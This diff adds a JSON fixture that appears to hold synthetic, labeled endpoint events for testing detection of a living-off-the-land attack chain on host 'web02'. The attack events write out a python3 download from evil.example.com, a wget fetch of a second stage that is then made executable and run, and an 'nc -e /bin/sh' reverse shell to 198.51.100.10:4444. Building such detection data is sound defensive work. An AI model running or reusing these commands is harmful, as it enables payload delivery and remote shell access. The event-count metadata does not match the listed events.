@@ -1,0 +1,21 @@
+{
+  "scenario_name": "lolbin_chain",
+  "description": "Living-off-the-land binary chain: bash spawns python3, downloads payload, executes, opens reverse shell",
+  "attack_techniques": ["T1059.004", "T1059.006", "T1105", "T1571"],
+  "kill_chain_phases": ["execution", "command_and_control"],
+  "total_events": 25,
+  "attack_events": 8,
+  "events": [
+    {"@timestamp": "2026-03-03T14:00:00Z", "process.name": "bash", "process.parent.name": "sshd", "user.name": "deploy", "host.hostname": "web02", "process.command_line": "bash -i", "event.action": "process_started", "is_attack": true, "attack_technique": "T1059.004", "attack_phase": "execution"},
+    {"@timestamp": "2026-03-03T14:00:30Z", "process.name": "python3", "process.parent.name": "bash", "user.name": "deploy", "host.hostname": "web02", "process.command_line": "python3 -c 'import urllib.request; urllib.request.urlretrieve(\"http://evil.example.com/payload\", \"/tmp/.update\")'", "event.action": "process_started", "is_attack": true, "attack_technique": "T1059.006", "attack_phase": "execution"},
+    {"@timestamp": "2026-03-03T14:01:00Z", "process.name": "wget", "process.parent.name": "bash", "user.name": "deploy", "host.hostname": "web02", "destination.ip": "198.51.100.10", "process.command_line": "wget -q http://evil.example.com/stage2 -O /tmp/.stage2", "event.action": "process_started", "is_attack": true, "attack_technique": "T1105", "attack_phase": "command_and_control"},
+    {"@timestamp": "2026-03-03T14:01:30Z", "process.name": "chmod", "process.parent.name": "bash", "user.name": "deploy", "host.hostname": "web02", "process.command_line": "chmod +x /tmp/.stage2", "event.action": "process_started", "is_attack": true, "attack_technique": "T1222.002", "attack_phase": "defense_evasion"},
+    {"@timestamp": "2026-03-03T14:02:00Z", "process.name": ".stage2", "process.parent.name": "bash", "user.name": "deploy", "host.hostname": "web02", "process.command_line": "/tmp/.stage2", "event.action": "process_started", "is_attack": true, "attack_technique": "T1059.004", "attack_phase": "execution"},
+    {"@timestamp": "2026-03-03T14:02:30Z", "process.name": "nc", "process.parent.name": ".stage2", "user.name": "deploy", "host.hostname": "web02", "destination.ip": "198.51.100.10", "destination.port": 4444, "process.command_line": "nc -e /bin/sh 198.51.100.10 4444", "event.action": "process_started", "is_attack": true, "attack_technique": "T1571", "attack_phase": "command_and_control"},
+    {"@timestamp": "2026-03-03T14:03:00Z", "process.name": "whoami", "process.parent.name": "sh", "user.name": "deploy", "host.hostname": "web02", "process.command_line": "whoami", "event.action": "process_started", "is_attack": true, "attack_technique": "T1033", "attack_phase": "discovery"},
+    {"@timestamp": "2026-03-03T14:03:30Z", "process.name": "id", "process.parent.name": "sh", "user.name": "deploy", "host.hostname": "web02", "process.command_line": "id", "event.action": "process_started", "is_attack": true, "attack_technique": "T1033", "attack_phase": "discovery"},
+    {"@timestamp": "2026-03-03T14:00:10Z", "process.name": "nginx", "process.parent.name": "systemd", "user.name": "www-data", "host.hostname": "web02", "event.action": "process_started", "is_attack": false, "attack_technique": null, "attack_phase": null},
+    {"@timestamp": "2026-03-03T14:01:10Z", "process.name": "node", "process.parent.name": "systemd", "user.name": "deploy", "host.hostname": "web02", "event.action": "process_started", "is_attack": false, "attack_technique": null, "attack_phase": null},
+    {"@timestamp": "2026-03-03T14:02:10Z", "process.name": "sshd", "process.parent.name": "systemd", "user.name": "root", "host.hostname": "web02", "event.action": "process_started", "is_attack": false, "attack_technique": null, "attack_phase": null}
+  ]
+}
